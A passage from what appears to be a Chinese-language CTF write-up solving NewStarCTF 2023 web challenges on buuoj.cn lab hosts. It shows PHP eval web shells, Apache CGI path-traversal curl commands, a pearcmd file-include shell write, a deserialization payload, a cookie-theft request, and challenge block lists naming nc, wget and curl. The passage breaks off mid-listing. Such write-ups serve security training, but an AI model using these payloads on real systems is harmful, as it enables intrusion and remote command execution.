</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;1.php.aaa&#34;
</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php eval($_POST[1]);
</span></span><span class=line><span class=cl>------WebKitFormBoundarylzTW48ByROVxArdw
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;submit&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>提交
</span></span><span class=line><span class=cl>------WebKitFormBoundarylzTW48ByROVxArdw--
</span></span></code></pre></td></tr></table></div></div><h2 id=unsafe-apache>Unsafe Apache</h2><p><a class=link href=https://blog.csdn.net/qq_60905276/article/details/125163219 target=_blank rel=noopener>https://blog.csdn.net/qq_60905276/article/details/125163219</a></p><p>这个洞我上个月实习的时候还刚好打过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --data <span class=s2>&#34;echo;ls /&#34;</span> http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl --data <span class=s2>&#34;echo;tac /ffffllllaaagggg_cc084c485d&#34;</span> http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh
</span></span></code></pre></td></tr></table></div></div><h2 id=so-baby-rce-again>So Baby RCE Again</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;cmd&#34;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/bash|curl/i&#39;</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;cmd&#34;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Hacker!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;cmd&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以写入文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?cmd=echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs= | base64 -d &gt; shell.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>find / -user root -perm -4000 -print 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>date -f /ffll444aaggg
</span></span></code></pre></td></tr></table></div></div><h2 id=include->Include 🍐</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag|log|session|filter|input|data/i&#39;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;hacker!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>include</span><span class=p>(</span><span class=nv>$file</span><span class=o>.</span><span class=s2>&#34;.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1># Something in phpinfo.php!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/index.php?+config-create+/&amp;file=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;+shell.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81/login.php</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=cq0044fmuc7eqlfr48duuljvl9</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span></code></pre></td></tr></table></div></div><p>一样的</p><h2 id=rce-2>R!!!C!!!E!!!</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>minipop</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$qwejaskdjnlka</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=nx>exec</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;alright&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>qwejaskdjnlka</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;payload&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=c1>//wanna try?
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;payload&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>没有链子，就是直线</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>minipop::__destruct-&gt;minipop::__toString()
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>minipop</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//    public $code=&#34;ls / | t&#39;&#39;ee 1&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;tac /flag_is_h3eeere | t&#39;&#39;ee 1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$qwejaskdjnlka</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>minipop</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span> <span class=k>new</span> <span class=nx>minipop</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>-&gt;</span><span class=na>qwejaskdjnlka</span><span class=o>=</span><span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=webshell的利用>WebShell的利用</h2><p>解出来是这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;7d67973a&#39;</span><span class=p>])(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;9fa3&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=nextdrive>NextDrive</h2><p>注册登录之后发现<code>test.res.http</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>content-type</span><span class=o>:</span> <span class=l>application/json; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>content-length</span><span class=o>:</span> <span class=l>50</span>
</span></span><span class=line><span class=cl><span class=n>date</span><span class=o>:</span> <span class=l>Tue, 06 Oct 2023 13:39:21 GMT</span>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>keep-alive</span><span class=o>:</span> <span class=l>timeout=5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;code&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span><span class=nt>&#34;msg&#34;</span><span class=p>:</span><span class=s2>&#34;success&#34;</span><span class=p>,</span><span class=nt>&#34;logged&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;data&#34;</span><span class=p>:[{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;すずめ feat.十明 - RADWIMPS,十明.flac&#34;</span><span class=p>,</span><span class=nt>&#34;hash&#34;</span><span class=p>:</span><span class=s2>&#34;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&#34;</span><span class=p>,</span><span class=nt>&#34;size&#34;</span><span class=p>:</span><span class=mi>27471829</span><span class=p>,</span><span class=nt>&#34;uploader&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;uploader_uid&#34;</span><span class=p>:</span><span class=s2>&#34;100000&#34;</span><span class=p>,</span><span class=nt>&#34;shareTime&#34;</span><span class=p>:</span><span class=mi>1754741179527</span><span class=p>,</span><span class=nt>&#34;isYours&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;isOwn&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;ownFn&#34;</span><span class=p>:</span><span class=s2>&#34;すずめ feat.十明 - RADWIMPS,十明.flac&#34;</span><span class=p>},{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Windows 12 Concept.png&#34;</span><span class=p>,</span><span class=nt>&#34;hash&#34;</span><span class=p>:</span><span class=s2>&#34;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&#34;</span><span class=p>,</span><span class=nt>&#34;size&#34;</span><span class=p>:</span><span class=mi>440707</span><span class=p>,</span><span class=nt>&#34;uploader&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;uploader_uid&#34;</span><span class=p>:</span><span class=s2>&#34;100000&#34;</span><span class=p>,</span><span class=nt>&#34;shareTime&#34;</span><span class=p>:</span><span class=mi>1754741180080</span><span class=p>,</span><span class=nt>&#34;isYours&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;isOwn&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;ownFn&#34;</span><span class=p>:</span><span class=s2>&#34;Windows 12 Concept.png&#34;</span><span class=p>},{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;信息安全技术信息安全事件分类分级指南.pdf&#34;</span><span class=p>,</span><span class=nt>&#34;hash&#34;</span><span class=p>:</span><span class=s2>&#34;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&#34;</span><span class=p>,</span><span class=nt>&#34;size&#34;</span><span class=p>:</span><span class=mi>330767</span><span class=p>,</span><span class=nt>&#34;uploader&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;uploader_uid&#34;</span><span class=p>:</span><span class=s2>&#34;100000&#34;</span><span class=p>,</span><span class=nt>&#34;shareTime&#34;</span><span class=p>:</span><span class=mi>1754741180106</span><span class=p>,</span><span class=nt>&#34;isYours&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;isOwn&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;ownFn&#34;</span><span class=p>:</span><span class=s2>&#34;信息安全技术信息安全事件分类分级指南.pdf&#34;</span><span class=p>},{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;不限速，就是快！.jpg&#34;</span><span class=p>,</span><span class=nt>&#34;hash&#34;</span><span class=p>:</span><span class=s2>&#34;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&#34;</span><span class=p>,</span><span class=nt>&#34;size&#34;</span><span class=p>:</span><span class=mi>32920</span><span class=p>,</span><span class=nt>&#34;uploader&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;uploader_uid&#34;</span><span class=p>:</span><span class=s2>&#34;100000&#34;</span><span class=p>,</span><span class=nt>&#34;shareTime&#34;</span><span class=p>:</span><span class=mi>1754741180130</span><span class=p>,</span><span class=nt>&#34;isYours&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;isOwn&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;ownFn&#34;</span><span class=p>:</span><span class=s2>&#34;不限速，就是快！.jpg&#34;</span><span class=p>},{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;test.req.http&#34;</span><span class=p>,</span><span class=nt>&#34;hash&#34;</span><span class=p>:</span><span class=s2>&#34;0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6&#34;</span><span class=p>,</span><span class=nt>&#34;size&#34;</span><span class=p>:</span><span class=mi>1085</span><span class=p>,</span><span class=nt>&#34;uploader&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;uploader_uid&#34;</span><span class=p>:</span><span class=s2>&#34;100000&#34;</span><span class=p>,</span><span class=nt>&#34;shareTime&#34;</span><span class=p>:</span><span class=mi>1754741180918</span><span class=p>,</span><span class=nt>&#34;isYours&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;isOwn&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;ownFn&#34;</span><span class=p>:</span><span class=s2>&#34;test.req.http&#34;</span><span class=p>}]}</span>
</span></span></code></pre></td></tr></table></div></div><p>搞了半天真是姐姐哇断奶了，秒传是因为hash一样所以造成的漏洞，如果我们用之前的重复文件的hash就再下载就可以得到admin的Cookie从而实现越权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/action/drive/upload/check</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>node5.buuoj.cn:27640</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://node5.buuoj.cn:27640</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://node5.buuoj.cn:27640/myresources</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>uid=100001; token=eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSIsInVpZCI6IjEwMDAwMSIsInRva2VuIjoiMmYzNDI1MzM4ZDExNGE3MzgzMzMzZDUzMDU1MDQ0ZDY0MzBlZmNmYTU5YTk1MjI2NjMzNmM5ZjBmODhlMjNjYiJ9LkEmUR1nHmZRTwx4LFELDkM.FG8wSkFdBGoJCQZ/BVtUQkFhN0kVAFZpDloAfVVbUBcWbGQdEFsBP18KUX5RCwQQF2k2H0wNUW8CBQJ7DAtUQhRhYR1BCgVvAwVXeQMFURsTb2BAQwhWOF0OVy0BCAQSHD1iQEQKUT4OWFsvBwsEQEFsaxsSWVE4XV8GLlYOB0A</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>103</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;hash&#34;</span><span class=p>:</span><span class=s2>&#34;0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6&#34;</span><span class=p>,</span><span class=nt>&#34;fn&#34;</span><span class=p>:</span><span class=s2>&#34;1.php.aaa&#34;</span><span class=p>,</span><span class=nt>&#34;autoup&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/newstarctf-2023-public-track/PixPin_2025-08-09_20-28-43.png width=1739 height=546 srcset="/p/newstarctf-2023-public-track/PixPin_2025-08-09_20-28-43_hu_5402f49fa6babce6.png 480w, /p/newstarctf-2023-public-track/PixPin_2025-08-09_20-28-43_hu_4bde436d6a3f8a3e.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=318 data-flex-basis=764px></p><p>拿到Cookie之后，可以得到js</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>Router</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;koa-router&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>router</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Router</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>CONFIG</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;../../runtime.config.json&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>Res</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;../../components/utils/response&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>FileSignUtil</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;../../components/utils/file-signature&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>DriveUtil</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;../../components/utils/database.utilities&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;fs&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;path&#34;</span><span class=p>);</span>
